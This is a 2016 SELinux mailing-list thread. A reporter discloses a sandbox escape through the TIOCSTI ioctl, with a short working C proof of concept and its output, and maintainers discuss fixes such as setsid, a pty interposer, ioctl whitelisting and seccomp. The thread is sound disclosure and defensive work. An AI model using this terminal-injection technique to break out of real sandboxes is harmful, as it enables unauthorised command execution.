Received: from goalie.tycho.ncsc.mil (goalie [144.51.242.250])
 by tarius.tycho.ncsc.mil (8.14.4/8.14.4) with ESMTP id u8NDueZc022749
 for <selinux@tycho.nsa.gov>; Fri, 23 Sep 2016 09:56:40 -0400
Received: by mail-oi0-f45.google.com with SMTP id a62so135203964oib.1
 for <selinux@tycho.nsa.gov>; Fri, 23 Sep 2016 06:56:38 -0700 (PDT)
MIME-Version: 1.0
In-Reply-To: <7f3ff80e-b385-357d-4460-85976656ea3d@tycho.nsa.gov>
References: <20160923112350.89325hv7y899lack@webmail.alunos.dcc.fc.up.pt>
 <CAHC9VhRpJQyeopPfhPOH6JSm+A0DLNXqQvW3EVY5YVymZD0qPg@mail.gmail.com>
 <7f3ff80e-b385-357d-4460-85976656ea3d@tycho.nsa.gov>
From: Paul Moore <pmoore@redhat.com>
Date: Fri, 23 Sep 2016 09:56:37 -0400
Message-ID: <CAGH-KgtAu1KmftRtB-ysfN5Tt8zwHXZXU8TVF_3k-2KPd6V6JQ@mail.gmail.com>
Subject: Re: SELinux sandbox escape via TIOCSTI ioctl
To: Stephen Smalley <sds@tycho.nsa.gov>
Cc: Paul Moore <paul@paul-moore.com>, up201407890@alunos.dcc.fc.up.pt,
 selinux@tycho.nsa.gov
Content-Type: text/plain; charset=UTF-8
List-Id: "Security-Enhanced Linux \(SELinux\) mailing list"
 <selinux.tycho.nsa.gov>
List-Post: <mailto:selinux@tycho.nsa.gov>
List-Help: <mailto:selinux-request@tycho.nsa.gov?subject=help>

On Fri, Sep 23, 2016 at 9:38 AM, Stephen Smalley <sds@tycho.nsa.gov> wrote:
> On 09/23/2016 09:28 AM, Paul Moore wrote:
>> On Fri, Sep 23, 2016 at 5:23 AM,  <up201407890@alunos.dcc.fc.up.pt> wrote:
>>> Hi,
>>>
>>> When executing a program via the SELinux sandbox, the nonpriv session can
>>> escape to the parent session by using the TIOCSTI ioctl to push characters
>>> into the terminal's input buffer, allowing an attacker to escape the
>>> sandbox.
>>>
>>> $ cat test.c
>>> #include <unistd.h>
>>> #include <sys/ioctl.h>
>>>
>>> int main()
>>> {
>>>   char *cmd = "id\n";
>>>   while(*cmd)
>>>    ioctl(0, TIOCSTI, cmd++);
>>>   execlp("/bin/id", "id", NULL);
>>> }
>>>
>>> $ gcc test.c -o test
>>> $ /bin/sandbox ./test
>>> id
>>> uid=1000 gid=1000 groups=1000
>>> context=unconfined_u:unconfined_r:sandbox_t:s0:c47,c176
>>> $ id    <------ did not type this
>>> uid=1000(saken) gid=1000(saken) groups=1000(saken)
>>> context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
>>
>> I've only just started looking at this, but it seems like we need a
>> call to tcflush()/ioctl(TCFLSH) in the sandbox tool immediately after
>> the sandboxed process exits.  Do any of the userspace tools guys have
>> any other ideas?
>
> Normally this is handled via setsid() or via a pty interposer.
> seunshare does call setsid(), so I believe that sandbox -X or -M are not
> susceptible to this, but sandbox without those options does not use
> seunshare.  run_init for example uses a pty interposer.

Good.  I had a feeling there was a simpler way to do this considering
the nature of the problem.

> Another
> alternative would be to use the ioctl whitelisting support added by
> Android to block use of TIOCSTI by the sandbox domains, but it is
> unclear if that is sufficient.

Filtering the specific ioctl is also possible with seccomp.

However, I think we need a solution that doesn't rely on the fine
grained ioctl controls as it is still relatively new and there are a
number of systems which don't currently support that functionality.

-- 
paul moore
security @ redhat
